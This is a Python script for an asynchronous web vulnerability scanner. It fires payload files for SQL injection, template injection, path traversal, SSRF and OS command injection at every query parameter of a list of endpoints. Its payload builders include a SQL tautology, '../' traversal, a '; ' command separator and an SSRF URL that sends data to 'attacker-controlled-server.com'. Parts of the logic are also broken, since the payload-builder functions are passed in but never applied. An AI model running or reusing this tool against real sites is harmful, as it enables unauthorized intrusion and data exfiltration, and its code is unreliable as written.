import aiohttp
import asyncio
import argparse
import concurrent.futures
from urllib.parse import urlparse, parse_qs

async def test_parameter(session, endpoint, parameter, vulnerability, payload_file):
    with open(payload_file, 'r') as file:
        payloads = [line.strip() for line in file]

    async def test(payload):
        url = f'{endpoint}&{parameter}={payload}'
        async with session.get(url) as response:
            if payload in await response.text():
                print(f'Potential vulnerability found at {url} with payload: {payload}')

    tasks = [test(payload) for payload in payloads]
    await asyncio.gather(*tasks)

async def test_endpoint(session, endpoint, vulnerability, payload_file):
    parsed_url = urlparse(endpoint)
    query_params = parse_qs(parsed_url.query)
    
    for parameter in query_params.keys():
        await test_parameter(session, endpoint, parameter, vulnerability, payload_file)

async def main():
    parser = argparse.ArgumentParser(description='Test various vulnerabilities on a list of endpoints.')
    parser.add_argument('--endpoints-file', help='File containing a list of endpoints', required=True)
    parser.add_argument('--sqli-payloads', help='File containing SQLi payloads', required=True)
    parser.add_argument('--ssti-payloads', help='File containing SSTI payloads', required=True)
    parser.add_argument('--lfi-payloads', help='File containing LFI payloads', required=True)
    parser.add_argument('--ssrf-payloads', help='File containing SSRF payloads', required=True)
    parser.add_argument('--cmd-inj-payloads', help='File containing OS Command Injection payloads', required=True)

    args = parser.parse_args()

    with open(args.endpoints_file, 'r') as file:
        endpoints = [line.strip() for line in file]

    async with aiohttp.ClientSession() as session:
        async def test_endpoint_wrapper(endpoint):
            await test_endpoint(session, endpoint, test_sqli, args.sqli_payloads)
            await test_endpoint(session, endpoint, test_ssti, args.ssti_payloads)
            await test_endpoint(session, endpoint, test_lfi, args.lfi_payloads)
            await test_endpoint(session, endpoint, test_ssrf, args.ssrf_payloads)
            await test_endpoint(session, endpoint, test_command_injection, args.cmd_inj_payloads)

        tasks = [test_endpoint_wrapper(endpoint) for endpoint in endpoints]
        await asyncio.gather(*tasks)

def test_sqli(payload):
    return f"' OR {payload} --"

def test_ssti(payload):
    return f'{{{{ {payload} }}}}'  # Adjust payload based on the application

def test_lfi(payload):
    return f'../../../../{payload}'  # Adjust payload based on the application

def test_ssrf(payload):
    return f'http://attacker-controlled-server.com?data={payload}'  # Adjust payload based on the application

def test_command_injection(payload):
    return f'; {payload}'

if __name__ == "__main__":
    # Run the asynchronous main function using threads
    with concurrent.futures.ThreadPoolExecutor() as executor:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(main())
